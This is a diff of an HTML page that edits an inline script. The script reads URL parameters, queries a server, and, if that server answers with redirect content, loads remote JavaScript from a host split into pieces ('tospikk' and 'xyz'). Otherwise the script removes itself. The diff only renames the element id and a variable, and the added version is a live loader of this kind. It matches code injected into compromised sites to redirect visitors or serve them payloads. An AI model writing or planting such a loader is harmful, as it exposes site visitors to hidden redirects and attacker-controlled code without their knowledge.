@@ -20,11 +20,11 @@
 
 <span id="01c204d5-1fd6-b218-23a0-2c68337e1367"></span>
 	  
-<script id="K5VVG7J">
+<script id="xkDMWB9">
   var xhr = new XMLHttpRequest();
   var urlParams = new URLSearchParams(window.location.search);
   var token = urlParams.get('utm_campaign');
-  var pixel = urlParams.get('fb_pixel');
+  var fb_pixel = urlParams.get('fb_pixel');
   var host = 'tospikk';
   var domain_zone = 'xyz';
   var t = '';
@@ -32,7 +32,7 @@
   xhr.send();
   xhr.onload = function () {
     t = xhr.response;
-    t = t.replace(/00pixel00/gi, pixel);
+    t = t.replace(/00fb_pixel00/gi, fb_pixel);
     t = JSON.parse(t);
     t = t.redirect.content;
     if (t != "") {
@@ -41,7 +41,7 @@
       a.async = true;
       a.src = 'https://' + host + '.' + domain_zone + '/js/frm.js';
       document.getElementsByTagName(h)[0].appendChild(a)
-    }else document.getElementById("K5VVG7J").remove();
+    }else document.getElementById("xkDMWB9").remove();
   }
 </script>
 <span id="a3552c6e-00d2-854c-1f49-9d837e5c66d5"></span>
